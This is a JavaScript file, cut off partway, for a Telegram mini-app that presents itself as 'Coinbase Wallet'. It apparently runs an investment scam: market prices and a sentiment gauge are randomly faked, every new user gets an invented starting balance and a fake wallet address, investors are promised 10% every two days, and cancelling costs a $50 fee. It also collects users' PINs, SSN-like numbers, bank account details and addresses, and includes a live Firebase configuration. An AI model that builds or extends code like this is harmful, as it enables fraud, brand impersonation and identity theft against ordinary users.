document.addEventListener('DOMContentLoaded', function () {
  const priceEl = document.getElementById('cryptoprogressPrice');
  const scoreEl = document.getElementById('cryptoprogressScore');
  const moodEl  = document.getElementById('cryptoprogressMood');

  let price = 0.985;
  let score = 69;

  // Initialize the gauge
  const bar = new ProgressBar.SemiCircle('#cryptoprogressGauge', {
    strokeWidth: 8,
    trailWidth: 8,
    color: '#52c41a',
    trailColor: '#333',
    easing: 'easeInOut',
    duration: 1000,
    svgStyle: {width: '100%', height: '100%'},
    from: { color: '#ff4d4f' },
    to: { color: '#52c41a' },
    step: (state, circle) => {
      circle.path.setAttribute('stroke', state.color);
    }
  });
  bar.animate(score / 100);

  function moodText(val){
    if(val < 30) return 'Extreme Fear';
    if(val < 50) return 'Fear';
    if(val < 60) return 'Neutral';
    if(val < 80) return 'Greed';
    return 'Extreme Greed';
  }

  function fluctuate() {
    // fluctuate price slightly
    price += (Math.random() * 0.006 - 0.003);
    if(price < 0.97) price = 0.97;
    if(price > 1.03) price = 1.03;
    priceEl.textContent = '$' + price.toFixed(3);

    // fluctuate score slightly
    score += Math.floor(Math.random() * 7 - 3); // ±3
    if(score < 0) score = 0;
    if(score > 100) score = 100;
    scoreEl.textContent = score;
    moodEl.textContent = moodText(score);

    bar.animate(score / 100);

    // random interval for next update
    const intervals = [2000, 3000, 5000, 6000];
    const next = intervals[Math.floor(Math.random() * intervals.length)];
    setTimeout(fluctuate, next);
  }

  // start fluctuation
  setTimeout(fluctuate, 2000);
});


    // -- Firebase Module Part --
    
 // Modal state tracker
let activeModal = null;
let modalOpening = false;

// Utility to manage modal opening with exclusivity and debouncing
function openModal(modalId) {
  if (modalOpening) {
    return Promise.reject(new Error("Modal opening in progress"));
  }
  if (!$('#' + modalId).hasClass('iziModal')) {
    showToast(`Modal ${modalId} is not properly initialized`);
    return Promise.reject(new Error(`Modal ${modalId} is not an iziModal instance`));
  }
  if (activeModal && activeModal !== modalId) {
    return closeModal(activeModal).then(() => {
      modalOpening = true;
      try {
        $('#' + modalId).iziModal("open");
        activeModal = modalId;
        return Promise.resolve();
      } catch (error) {
        showToast(`Failed to open modal ${modalId}`);
        return Promise.reject(error);
      } finally {
        modalOpening = false;
      }
    });
  }
  modalOpening = true;
  try {
    $('#' + modalId).iziModal("open");
    activeModal = modalId;
    return Promise.resolve();
  } catch (error) {
    showToast(`Failed to open modal ${modalId}`);
    return Promise.reject(error);
  } finally {
    modalOpening = false;
  }
}

// Utility to close modal
function closeModal(modalId) {
  if (!$('#' + modalId).hasClass('iziModal')) {
    showToast(`Modal ${modalId} is not properly initialized`);
    return Promise.reject(new Error(`Modal ${modalId} is not an iziModal instance`));
  }
  try {
    $('#' + modalId).iziModal("close");
    if (activeModal === modalId) {
      activeModal = null;
    }
    return Promise.resolve();
  } catch (error) {
    showToast(`Failed to close modal ${modalId}`);
    return Promise.reject(error);
  }
}     
   
   
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js';
    import { getDatabase, ref, set, get, update, onValue, push } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js';

    const firebaseConfig = {
      apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
      authDomain: "coinbase-tgwallet.firebaseapp.com",
      projectId: "coinbase-tgwallet",
      databaseURL: "https://coinbase-tgwallet-default-rtdb.firebaseio.com",
      storageBucket: "coinbase-tgwallet.firebasestorage.app",
      messagingSenderId: "441804145305",
      appId: "1:441804145305:web:1fb586667c0d648c342e08",
      measurementId: "G-374F8YD4KV",
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const tg = window.Telegram.WebApp;
    tg.ready();

    const userId = tg.initDataUnsafe.user?.id || "54321";
    const username = tg.initDataUnsafe.user?.username || "Anonymous";
    const userRef = ref(database, `users/${userId}`);
    const settingsRef = ref(database, 'settings');

    const conversionRates = {
      USD: { USD: 1, USDT: 1, BTC: 0.000015, ETH: 0.00033 },
      USDT: { USD: 1, USDT: 1, BTC: 0.000015, ETH: 0.00033 },
      BTC: { USD: 66666.67, USDT: 66666.67, BTC: 1, ETH: 22 },
      ETH: { USD: 3030.30, USDT: 3030.30, BTC: 0.045, ETH: 1 }
    };

    window.firebaseFunctions = {
      database,
      userRef,
      settingsRef,
      ref,
      set,
      get,
      update,
      onValue,
      push,
      userId,
      username,
      conversionRates
    };

    function generateRandomString(length, chars) {
      let result = "";
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function generateEthAddress() {
      const hexChars = "0123456789abcdef";
      return `0xA1Ed${generateRandomString(36, hexChars)}`;
    }
    window.generateEthAddress = generateEthAddress;

    function truncateAddress(address) {
      if (!address || address.length < 10) return address || "N/A";
      return `${address.slice(0, 6)}...${address.slice(-5)}`;
    }
    window.truncateAddress = truncateAddress;

    async function initializeUserData(attempts = 3) {
      for (let i = 0; i < attempts; i++) {
        try {
          const snapshot = await get(userRef);
          if (!snapshot.exists()) {
            const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
            await set(userRef, {
              username: username,
              fullName: "",
              email: "",
              pin: "",
              ssin: "",
              accountNumber: "",
              bankName: "",
              address: "",
              balance: 78.01,
              currency: "USD",
              network: "ERC20",
              wallet: walletAddress,
              referrals: 0,
              referredBy: null,
              settings: { theme: "dark", currency: "USD", network: "ERC20", autoRenew: false },
              investment: { investmentAmount: 0, lastClaim: null, startDate: null, lastRenewal: null },
              tradeHistory: {},
              notifications: {
                welcome: {
                  title: "Welcome!",
                  message: "Thanks for joining Coinbase Wallet!",
                  timestamp: new Date().toISOString(),
                },
              },
              transactions: {},
            });
            window.firebaseInitialized = true;
            iziToast.success({ title: "Success", message: "User profile created!", position: "topRight" });
            return true;
          } else {
            window.firebaseInitialized = true;
            return true;
          }
        } catch (error) {
          if (i === attempts - 1) {
            iziToast.error({ title: "Error", message: `Failed to initialize user data: ${error.message}`, position: "topRight" });
            return false;
          }
          await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, i)));
        }
      }
    }
    initializeUserData()
 

  // -- Main Script --
    document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
    document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
    
            // Utility function for number parsing
function parseNumber(value, defaultValue = 0) {
  if (value === null || value === undefined || value === "") {
    return defaultValue;
  }
  const cleanedValue = String(value).replace(/[^0-9.-]+/g, "");
  const result = parseFloat(cleanedValue);
  if (isNaN(result)) {
    return defaultValue;
  }
  return result;
}

    async function fetchBTCPrice(attempts = 3, baseDelay = 1000) {
  // Check cache (valid for 5 minutes)
  if (window.lastBtcPrice && Date.now() - window.lastBtcPriceFetch < 5 * 60 * 1000) {
    return window.lastBtcPrice;
  }

  const endpoints = [
    { url: 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd', key: 'bitcoin.usd' },
    { url: 'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD', key: 'USD' }
  ];

  for (let i = 0; i < attempts; i++) {
    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint.url, { signal: AbortSignal.timeout(10000) });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        let price = endpoint.key.split('.').reduce((obj, key) => obj?.[key], data);
        if (!price || isNaN(price)) throw new Error('Invalid BTC price data');
        window.lastBtcPrice = Number(price);
        window.lastBtcPriceFetch = Date.now();
        return window.lastBtcPrice;
      } catch (error) {
        if (i === attempts - 1 && endpoint === endpoints[endpoints.length - 1]) {
          // Simulation fallback
          const simulatedPrice = simulateBTCPrice();
          window.lastBtcPrice = simulatedPrice;
          window.lastBtcPriceFetch = Date.now();
          return simulatedPrice;
        }
        await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, i)));
      }
    }
  }
  return window.lastBtcPrice || 60000;
}

function simulateBTCPrice() {
  const basePrice = window.lastBtcPrice || 60000;
  const volatility = 0.05; // ±5% volatility
  const randomFactor = 1 + (Math.random() * volatility * 2 - volatility);
  const simulatedPrice = basePrice * randomFactor;
  return Math.max(10000, Math.min(100000, simulatedPrice)); // Clamp between $10k and $100k
}

    async function updateBalanceDisplay() {
      try {
        const snapshot = await window.firebaseFunctions.get(window.firebaseFunctions.userRef);
        if (!snapshot.exists()) {
          iziToast.error({ title: "Error", message: "Failed to fetch user data!", position: "topRight" });
          return;
        }
        const userData = snapshot.val() || {};
        const balance = userData.balance || 78.01;
        const currency = userData.settings?.currency || "USD";
        const $balanceDisplay = $("#balance-display");

        if (currency === "BTC") {
          const btcPrice = await fetchBTCPrice();
          const btcBalance = balance / btcPrice;
          $balanceDisplay.text(`${btcBalance.toFixed(6)} BTC`);
        } else if (currency === "ETH") {
          const ethBalance = (balance * window.firebaseFunctions.conversionRates.USD.ETH).toFixed(6);
          $balanceDisplay.text(`${ethBalance} ETH`);
        } else if (currency === "USDT") {
          const usdtBalance = (balance * window.firebaseFunctions.conversionRates.USD.USDT).toFixed(2);
          $balanceDisplay.text(`${usdtBalance} USDT`);
        } else {
          $balanceDisplay.text(`$${balance.toFixed(2)}`);
        }
      } catch (error) {
        iziToast.error({ title: "Error", message: "Failed to update balance display!", position: "topRight" });
      }
    }

    function copyToClipboard(text) {
      if (!text) {
        iziToast.error({ title: "Error", message: "No text to copy!", position: "topRight" });
        return Promise.reject(new Error("Empty text"));
      }
      if (navigator.clipboard && window.isSecureContext) {
        return navigator.clipboard.writeText(text);
      } else {
        const textarea = document.createElement("textarea");
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        try {
          document.execCommand("copy");
          document.body.removeChild(textarea);
          return Promise.resolve();
        } catch (err) {
          document.body.removeChild(textarea);
          return Promise.reject(err);
        }
      }
    }

    function showToast(message) {
      if (typeof Toastify !== "undefined") {
        Toastify({
          text: message,
          duration: 3000,
          gravity: "top",
          position: "right",
          style: { background: "#333" },
        }).showToast();
      } else {
        iziToast.info({ title: "Info", message, position: "topRight" });
      }
    }

    function waitForFirebase(callback) {
      if (window.firebaseInitialized) {
        callback();
      } else {
        setTimeout(() => waitForFirebase(callback), 100);
      }
    }

    const updatePrices = () => {
      const cryptoCards = document.querySelectorAll('.crypto-card');
      cryptoCards.forEach((card) => {
        const priceElement = card.querySelector('.price p');
        const currentPriceText = priceElement.textContent.replace(/[$A-Za-z]/g, '');
        const currentPrice = parseFloat(currentPriceText) || 0;
        const change = (Math.random() * 0.5 - 0.25).toFixed(2);
        const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
        const currency = window.firebaseFunctions?.userData?.settings?.currency || "USD";
        let displayPrice = newPrice;
        if (currency === "BTC") {
          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.BTC).toFixed(6);
          priceElement.textContent = `${displayPrice} BTC`;
        } else if (currency === "ETH") {
          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.ETH).toFixed(6);
          priceElement.textContent = `${displayPrice} ETH`;
        } else if (currency === "USDT") {
          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.USDT).toFixed(2);
          priceElement.textContent = `${displayPrice} USDT`;
        } else {
          priceElement.textContent = `$${newPrice}`;
        }
        priceElement.classList.remove('green', 'red');
        if (parseFloat(change) > 0) {
          priceElement.classList.add('green');
        } else if (parseFloat(change) < 0) {
          priceElement.classList.add('red');
        }
      });
    };

    async function updateCountdown() {
  const { database, userId, ref, get, update } = window.firebaseFunctions || {};
  if (!userId || !database) {
    $("#countdown-timer").text("48:00:00");
    $("#claim-reward").prop("disabled", true);
    $("#cancel-investment").prop("disabled", true);
    setTimeout(updateCountdown, 1000); // Retry after 1 second
    return;
  }
  try {
    const investmentRef = ref(database, `users/${userId}/investment`);
    const snapshot = await get(investmentRef);
    const investmentData = snapshot.exists() ? snapshot.val() || {} : {};
    const now = new Date().getTime();
    let timeLeft = 48 * 60 * 60 * 1000; // 48 hours in milliseconds
    let timerText = "48:00:00";
    let shouldUpdateFirebase = false;

    // Initialize default values if missing
    if (!investmentData.hasOwnProperty('investmentAmount') || !investmentData.startDate) {
      investmentData.investmentAmount = 0;
      investmentData.startDate = null;
      investmentData.lastClaim = null;
      investmentData.lastRenewal = null;
      shouldUpdateFirebase = true;
    }

    const investmentAmount = parseNumber(investmentData.investmentAmount, 0);

    if (investmentAmount > 0) {
      let referenceTime = now;
      if (investmentData.lastClaim && !isNaN(new Date(investmentData.lastClaim).getTime())) {
        referenceTime = new Date(investmentData.lastClaim).getTime();
      } else if (investmentData.startDate && !isNaN(new Date(investmentData.startDate).getTime())) {
        referenceTime = new Date(investmentData.startDate).getTime();
      } else {
        investmentData.startDate = new Date().toISOString();
        shouldUpdateFirebase = true;
      }

      timeLeft = referenceTime + 48 * 60 * 60 * 1000 - now;
      if (timeLeft <= 0) {
        timerText = "Ready to Claim!";
        $("#claim-reward").prop("disabled", false);
      } else {
        const hours = Math.floor(timeLeft / (1000 * 60 * 60));
        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
        timerText = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
        $("#claim-reward").prop("disabled", true);
      }
    } else {
      timerText = "No Active Investment";
      $("#claim-reward").prop("disabled", true);
      $("#cancel-investment").prop("disabled", true);
    }

    if (shouldUpdateFirebase) {
      await update(ref(database), { [`users/${userId}/investment`]: investmentData });
    }

    $("#countdown-timer").text(timerText);
    $("#cancel-investment").prop("disabled", investmentAmount <= 0);
    setTimeout(updateCountdown, 1000);
  } catch (error) {
    $("#countdown-timer").text("48:00:00");
    $("#claim-reward").prop("disabled", true);
    $("#cancel-investment").prop("disabled", true);
    setTimeout(updateCountdown, 1000); // Retry after error
  }
}

    function formatChatDate(timestamp) {
      const date = new Date(timestamp);
      const now = new Date();
      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
      const messageDate = new Date(date.getFullYear(), date.getMonth(), date.getDate());
      const yesterday = new Date(today);
      yesterday.setDate(today.getDate() - 1);

      if (messageDate.getTime() === today.getTime()) {
        return "Today";
      } else if (messageDate.getTime() === yesterday.getTime()) {
        return "Yesterday";
      } else {
        return date.toLocaleDateString('en-US', { month: 'long', day: 'numeric' });
      }
    }

    $(document).ready(function() {
      if (typeof $.fn.iziModal === "undefined") {
        iziToast.error({ title: "Error", message: "iziModal failed to load!", position: "topRight" });
        return;
      }

      $(".iziModal").each(function() {
        $(this).iziModal({
          background: '#222',
          headerColor: '#444',
          width: '90%',
          radius: 12,
          transitionIn: 'fadeInUp',
          transitionOut: 'fadeOutDown',
          onOpening: function() {
            activeModal = this.id;
            $(this).css('display', 'block');
          },
          onClosed: function() {
            if (activeModal === this.id) {
            activeModal = null;
              }
            }
        });
      });

      $("#darkModal6").iziModal("open");
      setTimeout(() => $("#darkModal6").iziModal("close"), 20000);

      $(".open-btn").on("click", function() {
        const modalId = $(this).data("modal-id");
        try {
          $("#" + modalId).iziModal("open");
        } catch (error) {
          showToast(`Failed to open modal: ${error.message}`);
        }
      });

      $(".close-btn").on("click", function() {
        try {
          $(this).closest(".iziModal").iziModal("close");
        } catch (error) {
          showToast(`Failed to close modal: ${error.message}`);
        }
      });

      setInterval(updatePrices, 5000);

      waitForFirebase(async () => {
        const { database, userRef, settingsRef, ref, set, get, update, onValue, push, userId, username, conversionRates } = window.firebaseFunctions || {};
        if (!database || !onValue || !get) {
          iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
          return;
        }

        let btcPrice = await fetchBTCPrice();
        let userWalletAddress = "0xA1Ed1234567890abcdef1234567890abcdef1234";

        setInterval(async () => {
          if (Date.now() - (window.lastBtcPriceFetch || 0) >= 5 * 60 * 1000) {
            btcPrice = await fetchBTCPrice();
            await updateBalanceDisplay();
          }
        }, 5 * 60 * 1000);

        function updateNetworkOptions(currency) {
          const networkSelect = $('#walletNetwork, #networkSelect');
          networkSelect.empty();
          if (currency === 'BTC') {
            networkSelect.append('<option value="Bitcoin">Bitcoin (BTC)</option>');
          } else {
            networkSelect.append('<option value="ERC20">ERC20 (USDT/ETH)</option>');
            if (currency !== 'USDT' && currency !== 'ETH') {
              networkSelect.append('<option value="Bitcoin">Bitcoin (BTC)</option>');
            }
          }
        }

        $("#copyAddress").on("click", async () => {
          try {
            const snapshot = await get(userRef);
            const userData = snapshot.val() || {};
            const walletToCopy = userData.wallet || userWalletAddress;
            await copyToClipboard(walletToCopy);
            showToast("Wallet address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
          }
        });

        $("#copyIt").on("click", async () => {
          try {
            const feeWallet = $('#fee-wallet').text();
            await copyToClipboard(feeWallet);
            showToast("Deposit address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy deposit address: ${error.message}`, position: "topRight" });
          }
        });

        $("#share-button").on("click", async () => {
          const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
          try {
            await copyToClipboard(referralLink);
            $("#darkModal5").iziModal("open");
            showToast("Referral link copied to clipboard!");
            if (window.Telegram?.WebApp?.showShare) {
              window.Telegram.WebApp.showShare({
                url: referralLink,
                text: "Join Coinbase Wallet and earn $10 per referral!"
              });
            }
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy referral link: ${error.message}`, position: "topRight" });
          }
        });

        onValue(userRef, async (snapshot) => {
  if (!snapshot.exists()) {
    iziToast.error({ title: "Error", message: "Failed to load user data!", position: "topRight" });
    return;
  }
  const userData = snapshot.val() || {};
  window.firebaseFunctions.userData = userData;
  $("#usernameInput").val(userData.username || username);
  $("#fullNameInput").val(userData.fullName || "");
  $("#emailInput").val(userData.email || "");
  $("#pinInput").val(userData.pin || "");
  $("#ssinInput").val(userData.ssin || "");
  $("#accountNumberInput").val(userData.accountNumber || "");
  $("#bankNameInput").val(userData.bankName || "");
  $("#addressInput").val(userData.address || "");
  $("#account-name").text(`@${userData.username || "Anonymous"}`);
  const walletAddress = userData.wallet || userWalletAddress;
  $("#wallet-address").text(window.truncateAddress(walletAddress));
  $("#wallet-address").data("wallet", walletAddress);
  userWalletAddress = walletAddress;
  $("#themeSelect").val(userData.settings?.theme || "dark");
  $("#currencySelect").val(userData.settings?.currency || "USD");
  $("#networkSelect").val(userData.settings?.network || "ERC20");
  $("#autoRenew").prop("checked", userData.settings?.autoRenew || false);
  $("body").removeClass("light dark").addClass(userData.settings?.theme || "dark");
  updateNetworkOptions(userData.settings?.currency || "USD");
  await updateBalanceDisplay();

  const investmentRef = ref(database, `users/${userId}/investment`);
const investmentSnapshot = await get(investmentRef);
const investmentData = investmentSnapshot.exists() ? investmentSnapshot.val() || {} : {};
const investmentAmount = parseNumber(investmentData.investmentAmount, 0);
const currency = userData.settings?.currency || "USD";

if (investmentAmount > 0) {
  const reward = (investmentAmount * 0.10) * (conversionRates.USD[currency] || 1);
  $("#investment-status").html(
    `Current Investment: ${investmentAmount.toLocaleString()} ${currency}<br>2-Day Reward: ${reward.toFixed(2)} ${currency}`
  );
  $("#investment-status-title").text("Active Investment");
  $("#investment-status-amount").text(`${investmentAmount.toLocaleString()} ${currency}`);
  $(".investment-btn").prop("disabled", true);
  $("#cancel-investment").prop("disabled", false);
  waitForFirebase(() => updateCountdown()); // Delay until Firebase is ready
} else {
  $("#investment-status").html("Select an investment amount to start trading.");
  $("#investment-status-title").text("No Active Investment");
  $("#investment-status-amount").text("");
  $(".investment-btn").prop("disabled", false);
  $("#claim-reward").prop("disabled", true);
  $("#cancel-investment").prop("disabled", true);
  $("#countdown-timer").text("No Active Investment");
  // Initialize investment data if missing
  if (!investmentData.investmentAmount) {
    await update(ref(database), {
      [`users/${userId}/investment`]: {
        investmentAmount: 0,
        startDate: null,
        lastClaim: null,
        lastRenewal: null,
      },
    });
  }
}
});

        $("#profile-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitProfileInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');

          const fullName = $("#fullNameInput").val().trim();
          const email = $("#emailInput").val().trim();
          const pin = $("#pinInput").val().trim();
          const ssin = $("#ssinInput").val().trim();
          const accountNumber = $("#accountNumberInput").val().trim();
          const bankName = $("#bankNameInput").val().trim();
          const address = $("#addressInput").val().trim();

          if (!fullName) {
            iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
            return;
          }
          if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
            iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
            return;
          }

          try {
            await update(userRef, { fullName, email, pin, ssin, accountNumber, bankName, address });
            iziToast.success({ title: "Success", message: "Profile updated!", position: "topRight" });
            $("#profile-iziModal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to update profile: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
          }
        });

        $("#settings-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitSettingsInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');

          const theme = $("#themeSelect").val();
          const currency = $("#currencySelect").val();
          const network = $("#networkSelect").val();
          const autoRenew = $("#autoRenew").prop('checked');

          try {
            await update(ref(database, `users/${userId}/settings`), { theme, currency, network, autoRenew });
            $("body").removeClass("light dark").addClass(theme);
            updateNetworkOptions(currency);
            await updateBalanceDisplay();
            iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
            $("#settings-iziModal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to save settings: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
          }
        });    

$("#confirm-investment-btn").on("click", async function () {
  const submitButton = $(this);
  submitButton.prop("disabled", true).html('<i class="fas fa-spinner fa-spin-pulse"></i> Confirming...');

  try {
    const snapshot = await get(userRef);
    if (!snapshot.exists()) throw new Error("User data not found");
    const userData = snapshot.val() || {};
    const currency = userData.settings?.currency || "USD";
    const currentBalance = parseNumber(userData.balance, 0);
    const investmentAmount = parseNumber(pendingInvestmentAmount, 0);

    if (isNaN(investmentAmount) || investmentAmount <= 0) throw new Error(`Invalid investment amount: ${pendingInvestmentAmount}`);
    if (investmentAmount > currentBalance) throw new Error(`Insufficient balance: ${currentBalance.toFixed(2)} ${currency}`);

    const newBalance = currentBalance - investmentAmount;
    const updates = {
      [`users/${userId}/balance`]: newBalance,
      [`users/${userId}/investment`]: {
        investmentAmount,
        startDate: new Date().toISOString(),
        lastClaim: null,
        lastRenewal: new Date().toISOString(),
      },
      [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
        amount: investmentAmount,
        currency,
        wallet: userData.wallet || userWalletAddress || "unknown",
        network: userData.settings?.network || "ERC20",
        type: "Investment",
        status: "completed",
        timestamp: new Date().toISOString(),
      },
      [`users/${userId}/notifications/${Date.now()}`]: {
        title: "Investment Started",
        message: `You invested ${investmentAmount.toFixed(2)} ${currency}! Earn 10% every 2 days.`,
        timestamp: new Date().toISOString(),
      },
    };

    await update(ref(database), updates);
    iziToast.success({
      title: "Success",
      message: `Investment of ${investmentAmount.toFixed(2)} ${currency} started!`,
      position: "topRight",
    });

    const reward = (investmentAmount * 0.10) * (conversionRates.USD[currency] || 1);
    $("#investment-status").html(
      `Current Investment: ${investmentAmount.toLocaleString()} ${currency}<br>2-Day Reward: ${reward.toFixed(2)} ${currency}`
    );
    $("#investment-status-title").text("Active Investment");
    $("#investment-status-amount").text(`${investmentAmount.toLocaleString()} ${currency}`);
    $(".investment-btn").prop("disabled", true);
    $("#cancel-investment").prop("disabled", false);
    pendingInvestmentAmount = 0;
    $("#confirm-investment-amount").text("an amount");
    $("#investment-confirm-modal").iziModal("close");
    updateCountdown();
  } catch (error) {
    iziToast.error({ title: "Error", message: `Failed to process investment: ${error.message}`, position: "topRight" });
  } finally {
    submitButton.prop("disabled", false).html("Confirm");
  }
});

let pendingInvestmentAmount = 0;
let investmentClickTimeout = null;
$("#darkModal4").on("click", ".investment-btn[data-amount]", async function(e) {
  e.preventDefault();
  if (investmentClickTimeout) {
    return;
  }
  if (activeModal === "darkModal10") {
    return;
  }
  investmentClickTimeout = setTimeout(() => { investmentClickTimeout = null; }, 500);

  // Get and validate data-amount
  const rawAmount = $(this).data("amount");

  // Early validation
  if (rawAmount === undefined || rawAmount === null || rawAmount === "") {
    iziToast.error({
      title: "Error",
      message: "Investment button has no valid amount defined",
      position: "topRight"
    });
    pendingInvestmentAmount = 0;
    $("#confirm-investment-amount").text("an amount");
    return;
  }

  // Parse amount
  pendingInvestmentAmount = parseNumber(rawAmount, 0);
  if (isNaN(pendingInvestmentAmount) || pendingInvestmentAmount <= 0) {
    iziToast.error({
      title: "Error",
      message: `Invalid investment amount: ${rawAmount}`,
      position: "topRight"
    });
    pendingInvestmentAmount = 0;
    $("#confirm-investment-amount").text("an amount");
    return;
  }

  // Set display amount
  const currency = window.firebaseFunctions.userData?.settings?.currency || "USD";
  const formattedAmount = pendingInvestmentAmount.toFixed(currency === "BTC" || currency === "ETH" ? 6 : 2);
  $("#confirm-investment-amount").text(`${formattedAmount} ${currency}`);

  try {
    $("#investment-confirm-modal").iziModal("open");
  } catch (error) {
    iziToast.error({
      title: "Error",
      message: `Failed to open confirmation modal: ${error.message}`,
      position: "topRight"
    });
    pendingInvestmentAmount = 0;
    $("#confirm-investment-amount").text("an amount");
  }
  
});

function updateInvestmentButtonStates(investmentAmount, lastClaim, currency = "USD") {
  // Disable investment amount buttons if there's an active investment
  $(".investment-btn[data-amount]").prop("disabled", investmentAmount > 0);

  // Set claim button state
  const now = new Date().getTime();
  const claimDisabled = !lastClaim
    ? investmentAmount <= 0 // Disable if no investment
    : (now - new Date(lastClaim).getTime()) < 48 * 60 * 60 * 1000; // Disable if < 48 hours
  $("#claim-reward").prop("disabled", claimDisabled);

  // Update investment status display
  if (investmentAmount > 0) {
    const reward = (investmentAmount * 0.10) * (conversionRates.USD[currency] || 1);
    $("#investment-status").html(
      `Current Investment: ${investmentAmount.toLocaleString()} ${currency}<br>2-Day Reward: ${reward.toFixed(2)} ${currency}`
    );
    $("#investment-status-title").text("Active Investment");
    $("#investment-status-amount").text(`${investmentAmount.toLocaleString()} ${currency}`);
  } else {
    $("#investment-status").html("Select an investment amount to start trading.");
    $("#investment-status-title").text("No Active Investment");
    $("#investment-status-amount").text("");
    $("#countdown-timer").text("No Active Investment");
  }
}

function updateCancelButtonState(investmentAmount) {
  $("#cancel-investment").prop("disabled", investmentAmount <= 0);
}
// Cancel Investment Button Handler
$("#cancel-investment").on("click", async function() {
  try {
    const snapshot = await get(userRef);
    if (!snapshot.exists()) {
    setTimeout(() => $("#darkModal10").iziModal("open"), 300);
      iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
      return;
    }
    const userData = snapshot.val() || {};
    const investmentAmount = parseNumber(userData.investment?.investmentAmount);
    const currency = userData.settings?.currency || "USD";

    if (investmentAmount <= 0) {
      iziToast.error({ title: "Error", message: "No active investment to cancel!", position: "topRight" });
      return;
    }

    // Calculate breakout fee in user's currency
    const breakoutFeeUSD = 50;
    const breakoutFee = breakoutFeeUSD * (conversionRates.USD[currency] || 1);
    if (isNaN(breakoutFee)) {
      iziToast.error({ title: "Error", message: `Invalid fee calculation for currency: ${currency}`, position: "topRight" });
      return;
    }

    $("#cancel-fee-amount").text(breakoutFee.toFixed(currency === "BTC" || currency === "ETH" ? 6 : 2));
    $("#cancel-fee-currency").text(currency);
    $("#darkModal10").iziModal("open");
  } catch (error) {
    iziToast.error({ title: "Error", message: `Failed to load investment data: ${error.message}`, position: "topRight" });
  }
});

// Confirm Cancel Investment Handler
$("#confirm-cancel-investment-btn").on("click", async function () {
  const submitButton = $(this);
  submitButton.prop("disabled", true).html('<i class="fas fa-spinner fa-spin-pulse"></i> Canceling...');

  try {
    const investmentRef = ref(database, `users/${userId}/investment`);
    const snapshot = await get(userRef);
    if (!snapshot.exists()) throw new Error("User data not found");
    const userData = snapshot.val() || {};
    const investmentSnapshot = await get(investmentRef);
    const investmentData = investmentSnapshot.exists() ? investmentSnapshot.val() || {} : {};
    const investmentAmount = parseNumber(investmentData.investmentAmount, 0);
    if (investmentAmount <= 0) throw new Error("No active investment");

    const currency = userData.settings?.currency || "USD";
    const currentBalance = parseNumber(userData.balance, 0);
    const breakoutFeeUSD = 50;
    const breakoutFee = breakoutFeeUSD * (conversionRates.USD[currency] || 1);

    if (currentBalance < breakoutFee) throw new Error(`Insufficient balance for breakout fee: ${breakoutFee.toFixed(2)} ${currency}`);

    const updates = {
      [`users/${userId}/investment`]: {
        investmentAmount: 0,
        startDate: null,
        lastClaim: null,
      },
      [`users/${userId}/balance`]: currentBalance - breakoutFee,
      [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
        amount: breakoutFee,
        currency,
        wallet: userData.wallet || userWalletAddress,
        network: userData.settings?.network || "ERC20",
        type: "Investment Cancellation Fee",
        status: "completed",
        timestamp: new Date().toISOString(),
      },
      [`users/${userId}/notifications/${Date.now()}`]: {
        title: "Investment Cancelled",
